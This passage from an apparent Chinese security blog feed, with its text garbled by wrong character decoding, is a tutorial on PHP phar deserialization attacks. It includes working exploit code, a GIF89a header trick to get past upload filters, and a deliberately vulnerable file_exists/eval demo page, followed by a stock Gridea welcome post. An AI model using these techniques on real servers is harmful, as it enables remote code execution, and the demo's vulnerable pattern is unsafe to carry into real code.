<p>æ¼æ´æˆå› ï¼š<code>phar</code>å­˜å‚¨çš„<code>meta-data</code>ä¿¡æ¯ä»¥åºåˆ—åŒ–æ–¹å¼å­˜å‚¨ï¼Œå½“æ–‡ä»¶æ“ä½œå‡½æ•°é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æ<code>phar</code>æ–‡ä»¶æ—¶å°±ä¼šå°†æ•°æ®ååºåˆ—åŒ–</p>
<h3 id="demoæµ‹è¯•">demoæµ‹è¯•</h3>
<p>æ ¹æ®æ–‡ä»¶ç»“æ„æˆ‘ä»¬æ¥è‡ªå·±æ„å»ºä¸€ä¸ª<code>phar</code>æ–‡ä»¶ï¼Œ<code>php</code>å†…ç½®äº†ä¸€ä¸ª<code>Phar</code>ç±»æ¥å¤„ç†ç›¸å…³æ“ä½œ</p>
<pre><code>&lt;?php
    class TestObject {
    }

    @unlink(&quot;phar.phar&quot;);
    $phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar
    $phar-&gt;startBuffering();
    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub
    $o = new TestObject();
    $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest
    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶
    //ç­¾åè‡ªåŠ¨è®¡ç®—
    $phar-&gt;stopBuffering();
?&gt;
</code></pre>
<p>å¯ä»¥å¾ˆæ˜æ˜¾çœ‹åˆ°<code>manifest</code>æ˜¯ä»¥åºåˆ—åŒ–å½¢å¼å­˜å‚¨çš„</p>
<figure data-type="image" tabindex="34"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145235-01d2d2fe-0519-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145235-01d2d2fe-0519-1.png" alt="img" loading="lazy"></a></figure>
<p>æœ‰åºåˆ—åŒ–æ•°æ®å¿…ç„¶ä¼šæœ‰ååºåˆ—åŒ–æ“ä½œï¼Œ<code>php</code>ä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æ<code>phar</code>æ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†<code>meta-data</code>è¿›è¡Œååºåˆ—åŒ–<br>
åœ¨ç½‘ä¸Šæ‰’äº†ä¸€å¼ å›¾</p>
<figure data-type="image" tabindex="35"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145239-0436a1c4-0519-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145239-0436a1c4-0519-1.png" alt="img" loading="lazy"></a></figure>
<p>ç”¨å¦‚ä¸‹demoè¯æ˜</p>
<pre><code>&lt;?php 
    class TestObject {
        public function __destruct() {
            echo 'hello ghtwf01';
        }
    }

    $filename = 'phar://phar.phar/test.txt';
    file_get_contents($filename); 
?&gt;
</code></pre>
<figure data-type="image" tabindex="36"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145244-07779b54-0519-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145244-07779b54-0519-1.png" alt="img" loading="lazy"></a></figure>
<p>å½“æ–‡ä»¶ç³»ç»Ÿå‡½æ•°çš„å‚æ•°å¯æ§æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸è°ƒç”¨<code>unserialize()</code>çš„æƒ…å†µä¸‹è¿›è¡Œååºåˆ—åŒ–æ“ä½œ,æå¤§çš„æ‹“å±•äº†æ”»å‡»é¢ï¼Œå…¶å®ƒå‡½æ•°ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæ¯”å¦‚<code>file_exists</code>å‡½æ•°,ä»£ç å¦‚ä¸‹</p>
<pre><code>&lt;?php 
    class TestObject {
        public function __destruct() {
            echo 'hello ghtwf01';
        }
    }

    $filename = 'phar://phar.phar/a_random_string';
    file_exists($filename);
 ?&gt;
</code></pre>
<figure data-type="image" tabindex="37"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145250-0ab8db34-0519-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145250-0ab8db34-0519-1.png" alt="img" loading="lazy"></a></figure>
<h3 id="å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶">å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶</h3>
<p>åœ¨å‰é¢åˆ†æ<code>phar</code>çš„æ–‡ä»¶ç»“æ„æ—¶å¯èƒ½ä¼šæ³¨æ„åˆ°ï¼Œ<code>php</code>è¯†åˆ«<code>phar</code>æ–‡ä»¶æ˜¯é€šè¿‡å…¶æ–‡ä»¶å¤´çš„<code>stub</code>ï¼Œæ›´ç¡®åˆ‡ä¸€ç‚¹æ¥è¯´æ˜¯<code>__HALT_COMPILER();?&gt;</code>è¿™æ®µä»£ç ï¼Œå¯¹å‰é¢çš„å†…å®¹æˆ–è€…åç¼€åæ˜¯æ²¡æœ‰è¦æ±‚çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ·»åŠ ä»»æ„çš„æ–‡ä»¶å¤´+ä¿®æ”¹åç¼€åçš„æ–¹å¼å°†<code>phar</code>æ–‡ä»¶ä¼ªè£…æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶</p>
<pre><code>&lt;?php
    class TestObject {
    }

    @unlink(&quot;phar.phar&quot;);
    $phar = new Phar(&quot;phar.phar&quot;);
    $phar-&gt;startBuffering();
    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´
    $o = new TestObject();
    $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest
    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶
    //ç­¾åè‡ªåŠ¨è®¡ç®—
    $phar-&gt;stopBuffering();
?&gt;
</code></pre>
<figure data-type="image" tabindex="38"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145254-0d4bc884-0519-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145254-0d4bc884-0519-1.png" alt="img" loading="lazy"></a></figure>
<p>é‡‡ç”¨è¿™ç§æ–¹æ³•å¯ä»¥ç»•è¿‡å¾ˆå¤§ä¸€éƒ¨åˆ†ä¸Šä¼ æ£€æµ‹</p>
<h4 id="åˆ©ç”¨æ¡ä»¶">åˆ©ç”¨æ¡ä»¶</h4>
<pre><code>pharæ–‡ä»¶éœ€è¦ä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯
è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€
æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤
</code></pre>
<h4 id="æ¼æ´å¤ç°">æ¼æ´å¤ç°</h4>
<p>upload.php<br>
ç™½åå•åªå…è®¸ä¸Šä¼ <code>jpg,png,gif</code></p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;æ–‡ä»¶ä¸Šä¼ &lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
        &lt;input type=&quot;file&quot; name=&quot;pic&quot; /&gt;
        &lt;input type=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot;/&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;?php
    header(&quot;Content-type:text/html;charset=utf-8&quot;);
    $ext_arr=array('.jpg','.png','.gif');
    if(empty($_FILES)){
        echo &quot;è¯·ä¸Šä¼ æ–‡ä»¶&quot;;
    }else{
        define(&quot;PATH&quot;,dirname(__DIR__));
        $path=PATH.&quot;/&quot;.&quot;upload&quot;.&quot;/&quot;.&quot;images&quot;;
        $filetype=strrchr($_FILES[&quot;pic&quot;][&quot;name&quot;],&quot;.&quot;);
        if(in_array($filetype,$ext_arr)){
            move_uploaded_file($_FILES[&quot;pic&quot;][&quot;tmp_name&quot;],$path.&quot;/&quot;.$_FILES[&quot;pic&quot;][&quot;name&quot;]);
            echo &quot;ä¸Šä¼ æˆåŠŸï¼&quot;;
            }else{
                    echo &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;;
            }

        }
?&gt;
</code></pre>
<p>file_exists.php<br>
éªŒè¯æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œæ¼æ´åˆ©ç”¨ç‚¹:<code>file_exists()</code>å‡½æ•°</p>
<pre><code>&lt;?php
$filename=$_GET['filename'];
class ghtwf01{
    public $a = 'echo exists;';
    function __destruct()
    {
        eval($this -&gt; a);
    }
}
file_exists($filename);
?&gt;
</code></pre>
<p>æ„é€ pharæ–‡ä»¶</p>
<pre><code>&lt;?php
class ghtwf01{
    public $a = 'phpinfo();';
    function __destruct()
    {
        eval($this -&gt; a);
    }
}
$phar = new Phar('phar.phar');
$phar -&gt; stopBuffering();
$phar -&gt; setStub('GIF89a'.'&lt;?php __HALT_COMPILER();?&gt;');
$phar -&gt; addFromString('test.txt','test');
$object = new ghtwf01();
$phar -&gt; setMetadata($object);
$phar -&gt; stopBuffering();
?&gt;
</code></pre>
<p>æ”¹åç¼€åä¸º<code>gif</code>ï¼Œç„¶åä¸Šä¼ ï¼Œæœ€ååœ¨<code>file_exists.php</code>åˆ©ç”¨æ¼æ´</p>
<figure data-type="image" tabindex="39"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145302-1225f852-0519-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112145302-1225f852-0519-1.png" alt="img" loading="lazy"></a></figure>
<h1 id="å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥</h1>
<p>https://www.freebuf.com/articles/web/206249.html<br>
http://mini.eastday.com/mobile/190306223633207.html#<br>
https://www.jianshu.com/p/54e93e92ba9e<br>
https://www.jb51.net/article/79144.htm<br>
https://xz.aliyun.com/t/6640<br>
https://www.freebuf.com/vuls/202819.html<br>
https://blog.csdn.net/u011474028/article/details/54973571<br>
https://xz.aliyun.com/t/2715<br>
<a href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Hello Gridea]]></title>
        <id>https://outlaws-bai.github.io/post/hello-gridea/</id>
        <link href="https://outlaws-bai.github.io/post/hello-gridea/">
        </link>
        <updated>2018-12-11T16:00:00.000Z</updated>
        <summary type="html"><![CDATA[<p>ğŸ‘  æ¬¢è¿ä½¿ç”¨ <strong>Gridea</strong> ï¼<br>
âœï¸  <strong>Gridea</strong> ä¸€ä¸ªé™æ€åšå®¢å†™ä½œå®¢æˆ·ç«¯ã€‚ä½ å¯ä»¥ç”¨å®ƒæ¥è®°å½•ä½ çš„ç”Ÿæ´»ã€å¿ƒæƒ…ã€çŸ¥è¯†ã€ç¬”è®°ã€åˆ›æ„... ...</p>
]]></summary>
        <content type="html"><![CDATA[<p>ğŸ‘  æ¬¢è¿ä½¿ç”¨ <strong>Gridea</strong> ï¼<br>
âœï¸  <strong>Gridea</strong> ä¸€ä¸ªé™æ€åšå®¢å†™ä½œå®¢æˆ·ç«¯ã€‚ä½ å¯ä»¥ç”¨å®ƒæ¥è®°å½•ä½ çš„ç”Ÿæ´»ã€å¿ƒæƒ…ã€çŸ¥è¯†ã€ç¬”è®°ã€åˆ›æ„... ...</p>
<!-- more -->
<p><a href="https://github.com/getgridea/gridea">Github</a><br>
<a href="https://gridea.dev/">Gridea ä¸»é¡µ</a><br>
<a href="http://fehey.com/">ç¤ºä¾‹ç½‘ç«™</a></p>
<h2 id="ç‰¹æ€§">ç‰¹æ€§ğŸ‘‡</h2>
<p>ğŸ“  ä½ å¯ä»¥ä½¿ç”¨æœ€é…·çš„ <strong>Markdown</strong> è¯­æ³•ï¼Œè¿›è¡Œå¿«é€Ÿåˆ›ä½œ</p>
<p>ğŸŒ‰  ä½ å¯ä»¥ç»™æ–‡ç« é…ä¸Šç²¾ç¾çš„å°é¢å›¾å’Œåœ¨æ–‡ç« ä»»æ„ä½ç½®æ’å…¥å›¾ç‰‡</p>
<p>ğŸ·ï¸  ä½ å¯ä»¥å¯¹æ–‡ç« è¿›è¡Œæ ‡ç­¾åˆ†ç»„</p>
<p>ğŸ“‹  ä½ å¯ä»¥è‡ªå®šä¹‰èœå•ï¼Œç”šè‡³å¯ä»¥åˆ›å»ºå¤–éƒ¨é“¾æ¥èœå•</p>
<p>ğŸ’»  ä½ å¯ä»¥åœ¨ <strong>Windows</strong>ï¼Œ<strong>MacOS</strong> æˆ– <strong>Linux</strong> è®¾å¤‡ä¸Šä½¿ç”¨æ­¤å®¢æˆ·ç«¯</p>
<p>ğŸŒ  ä½ å¯ä»¥ä½¿ç”¨ <strong>ğ–¦ğ—‚ğ—ğ—ğ—ğ–» ğ–¯ğ–ºğ—€ğ–¾ğ—Œ</strong> æˆ– <strong>Coding Pages</strong> å‘ä¸–ç•Œå±•ç¤ºï¼Œæœªæ¥å°†æ”¯æŒæ›´å¤šå¹³å°</p>
<p>ğŸ’¬  ä½ å¯ä»¥è¿›è¡Œç®€å•çš„é…ç½®ï¼Œæ¥å…¥ <a href="https://github.com/gitalk/gitalk">Gitalk</a> æˆ– <a href="https://github.com/SukkaW/DisqusJS">DisqusJS</a> è¯„è®ºç³»ç»Ÿ</p>
<p>ğŸ‡¬ğŸ‡§  ä½ å¯ä»¥ä½¿ç”¨<strong>ä¸­æ–‡ç®€ä½“</strong>æˆ–<strong>è‹±è¯­</strong></p>
<p>ğŸŒ  ä½ å¯ä»¥ä»»æ„ä½¿ç”¨åº”ç”¨å†…é»˜è®¤ä¸»é¢˜æˆ–ä»»æ„ç¬¬ä¸‰æ–¹ä¸»é¢˜ï¼Œå¼ºå¤§çš„ä¸»é¢˜è‡ªå®šä¹‰èƒ½åŠ›</p>
<p>ğŸ–¥  ä½ å¯ä»¥è‡ªå®šä¹‰æºæ–‡ä»¶å¤¹ï¼Œåˆ©ç”¨ OneDriveã€ç™¾åº¦ç½‘ç›˜ã€iCloudã€Dropbox ç­‰è¿›è¡Œå¤šè®¾å¤‡åŒæ­¥</p>
<p>ğŸŒ± å½“ç„¶ <strong>Gridea</strong> è¿˜å¾ˆå¹´è½»ï¼Œæœ‰å¾ˆå¤šä¸è¶³ï¼Œä½†è¯·ç›¸ä¿¡ï¼Œå®ƒä¼šä¸åœå‘å‰ ğŸƒ</p>
<p>æœªæ¥ï¼Œå®ƒä¸€å®šä¼šæˆä¸ºä½ ç¦»ä¸å¼€çš„ä¼™ä¼´</p>
<p>å°½æƒ…å‘æŒ¥ä½ çš„æ‰åå§ï¼</p>
<p>ğŸ˜˜ Enjoy~</p>
]]></content>
    </entry>
</feed>